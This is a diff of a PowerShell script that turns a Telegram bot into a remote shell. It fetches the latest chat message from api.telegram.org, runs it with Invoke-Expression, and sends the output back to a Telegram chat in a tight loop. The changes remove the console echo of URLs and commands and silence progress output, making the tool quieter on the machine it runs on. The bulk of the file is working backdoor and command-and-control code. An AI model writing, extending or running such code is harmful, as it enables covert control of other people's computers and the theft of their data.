@@ -1,6 +1,5 @@
 
-$apiToken = "your Telegram Token"
-$chat_id = "chat id to your Telegram group"
+
 
 function read-comm()
 {
@@ -12,8 +11,9 @@ function read-comm()
         [string] $offset
    )
     $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
-    write-host $url
+    $ProgressPreference = 'SilentlyContinue' 
     $r=Invoke-WebRequest -Uri $url -UseBasicParsing
+    $ProgressPreference = 'Continue'
     $test = $r | ConvertFrom-Json
     $message = $test.result.message[-1]
     $message = $message.text
@@ -31,18 +31,19 @@ function Excmd
           [Parameter(Mandatory)]
       [string] $command
     )
-
-   write-host $command 
+   $ProgressPreference = 'SilentlyContinue' 
    $out = Invoke-Expression -Command $command | Out-String
+   $ProgressPreference = 'Continue'
    return $out
 }
 
 function Send-data ($data,$apiToken,$chat_id)
 {
     $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
-    write-host $url
-    Invoke-WebRequest -Uri $url
-    return $data
+    $ProgressPreference = 'SilentlyContinue' 
+    $r=Invoke-WebRequest -Uri $url
+    $ProgressPreference = 'Continue'
+    
 }
 
 
@@ -55,7 +56,9 @@ function First-offset
     )
 
     $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
+    $ProgressPreference = 'SilentlyContinue' 
     $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
+    $ProgressPreference = 'Continue'
     $Foffset = $r.result.update_id
     $foo = $Foffset[-1]
     if ($foo.ToString().Length -gt 1)
@@ -95,27 +98,25 @@ function start-myshell
                 $offset = $offset[-1]
             }
 
-            write-host $offset
+            
             if (-not($offset -eq $foo))
             {
                 $foo=$offset
                 $command = $message[0]
                 $output = Excmd $command
                 Send-data -data $output -chat_id $chat_id -apiToken $apiToken
-                write-host $command
+                
             }
             Start-Sleep -Seconds 0.3
         }    
         
         catch 
         {
-            write-host($Error[0].Exception)
+            LogWrite($Error[0].Exception)
         }
         
     }
 
 }
    
-
-start-myshell -apiToken $apiToken -chat_id $chat_id
 
